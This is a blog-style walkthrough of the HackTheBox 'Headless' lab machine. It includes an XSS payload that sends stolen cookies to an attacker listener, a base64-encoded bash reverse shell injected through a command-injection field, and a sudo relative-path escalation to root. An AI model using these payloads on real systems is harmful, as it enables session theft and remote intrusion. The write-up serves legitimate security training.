---
title: Headless
date: 2024-02-16
description: Detailed walkthrough of the Headless room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
  - XSS
categories:
  - HackTheBox
  - HackTheBox/Linux
image: images/Headless/banner.jpeg
---

# Headless

| Title       | Headless                                          |
| ----------- | ------------------------------------------------- |
| Description | HTB - Headless Easy Linux Box                     |
| Difficulty  | Easy                                              |
| Maker       | [dvir1](https://app.hackthebox.com/users/1422414) |

## Enumeration

Starting with `Nmap`,

```
└─$ cat nmap/headless.nmap
# Nmap 7.94SVN scan initiated Thu Jun 20 09:15:40 2024 as: nmap -sC -sV -oA nmap/headless 10.10.11.8
Nmap scan report for 10.10.11.8
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 20 Jun 2024 13:15:52 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

There are 2 services running, SSH on port `22` and http on port `5000`. On visiting the website, I found support endpoint `http://10.10.11.8:5000/support`. I tried sending request to support and intercepted using burpsuite.
![[Pasted image 20240620092544.png]]
It seems, the website is using `Werkzeug/2.2.2` library, I have searched for the exploits on internet - It seems in the exploit, it is using `/console` and apparently that path does not exists.
Let's find more endpoints using `gobuster`.
![[Pasted image 20240620103257.png]]
It seems there is `/dashboard` endpoint, which is giving `500 - Unauthorized`. Meanwhile, I can see there is `is_admin` cookie in nmap, so maybe I can try to get the the admin cookie with `/support` endpoint.

Payload

```Javascript
<script>var i=new Image(); i.src="http://10.10.14.65:8000/?cookie="+btoa(document.cookie);</script>
```

Try this payload in `User-Agent` and we will get the admin cookie on our listener. Start the listener using `python3 -m http.server`

```Shell
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.8 - - [20/Jun/2024 10:24:55] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
10.10.11.8 - - [20/Jun/2024 10:24:57] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```

Using `base64 -d` we will get the result in plain text -> `is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`. Now setting the cookie and visiting `/dashboard` which was `Unauthorized` before.
![[Pasted image 20240620103431.png]]
By changing the cookie, we can now able to see dashboard.

## User Flag

There is a button to generate report. On clicking the button, it is saying Systems are up and running. As it is related to system, first thing that came to my mind is command injection, so I have inserted `ls` with the date field.
![[Pasted image 20240620103637.png]]
And yes, my guess was correct, it is having command injection, now getting the shell. Direct bash rev shell is not spawning, so I have tried base64 encoded shell. To get that shell base64 encode this payload `bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1` then send it like this `echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjUvNDQ0NCAwPiYx | base64 -d | bash 2>/dev/null`
![[Pasted image 20240620104158.png]]
It will give us user shell.

## Root Flag

Checking the commands that can be run using root using `sudo -l`

```shell
dvir@headless:~/.ssh$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

Let's check `syscheck` file.

```bash
dvir@headless:~/.ssh$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

Everything is called using the absolute path except `initdb.sh` and it is being called by script, so we will add bash shell in that file.

```shell
dvir@headless:~$ echo '/bin/bash -p' > initdb.sh
dvir@headless:~$ chmod +x initdb.sh
dvir@headless:~$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.10, 0.07, 0.03
Database service is not running. Starting it...
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt
f172fd0974683a2e9d4c714271b3b854
```
